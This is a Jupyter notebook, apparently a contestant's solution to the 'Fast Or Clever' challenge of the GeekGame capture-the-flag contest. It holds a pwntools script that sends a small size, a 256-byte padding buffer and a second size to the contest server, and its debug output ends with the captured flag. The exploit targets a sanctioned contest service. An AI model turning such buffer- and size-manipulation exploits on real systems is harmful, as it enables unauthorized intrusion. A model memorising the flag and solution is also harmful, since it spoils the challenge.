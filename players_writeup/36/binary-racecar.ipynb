{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Fast Or Clever\n",
    "这道题我真的是瞎试出来的。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to prob11.geekgame.pku.edu.cn on port 10011\n",
      "[x] Opening connection to prob11.geekgame.pku.edu.cn on port 10011: Trying 115.27.246.20\n",
      "[+] Opening connection to prob11.geekgame.pku.edu.cn on port 10011: Done\n",
      "[DEBUG] Received 0x19 bytes:\n",
      "    b'Please input your token: '\n",
      "[DEBUG] Sent 0x64 bytes:\n",
      "    b'36:MASKED*****\\n'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\hrz\\AppData\\Local\\Temp\\ipykernel_42824\\1615003538.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n",
      "  c.sendlineafter(b'please enter the size to output your flag', '4')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] Received 0xf4 bytes:\n",
      "    b'for racecar drivers, there are two things to hope for: one is that you drive fast enough, and the other is that the opponent is slow enough.\\n'\n",
      "    b'Brave and clever contestant,  win the race to get the flag!\\n'\n",
      "    b'please enter the size to output your flag: '\n",
      "[DEBUG] Sent 0x2 bytes:\n",
      "    b'4\\n'\n",
      "[DEBUG] Received 0x3f bytes:\n",
      "    b'please enter the content to read to buffer (max 0x100 bytes): \\n'\n",
      "[DEBUG] Sent 0x101 bytes:\n",
      "    b'                                                                                                                                                                                                                                                                \\n'\n",
      "[DEBUG] Sent 0x3 bytes:\n",
      "    b'50\\n'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\hrz\\AppData\\Local\\Temp\\ipykernel_42824\\1615003538.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n",
      "  c.sendlineafter(b'please enter the content to read to buffer (max 0x100 bytes): ',\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] Received 0x92 bytes:\n",
      "    b'please enter the size to read to the buffer:\\n'\n",
      "    b'the size read to the buffer is too large\\n'\n",
      "    b'copying the flag...\\n'\n",
      "    b'flag{i_lik3_r4c3C4RS_v3rY_mucH_d0_y0U}\\n'\n",
      "    b'\\n'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'i_lik3_r4c3C4RS_v3rY_mucH_d0_y0U}\\n'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pwn\n",
    "\n",
    "with open('../token24.txt', 'rb') as f:\n",
    "    token = f.readline().rstrip(b'\\n')\n",
    "\n",
    "pwn.context.log_level = 'debug'\n",
    "\n",
    "c = pwn.remote('prob11.geekgame.pku.edu.cn', 10011)\n",
    "c.sendlineafter(b'Please input your token: ', token)\n",
    "c.sendlineafter(b'please enter the size to output your flag', '4')\n",
    "c.sendlineafter(b'please enter the content to read to buffer (max 0x100 bytes): ', \n",
    "                ' ' * 0x100 )\n",
    "c.sendline(b'50')\n",
    "c.recvuntil(b'flag{')\n",
    "c.recvuntil(b'\\n')                                                                          \n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
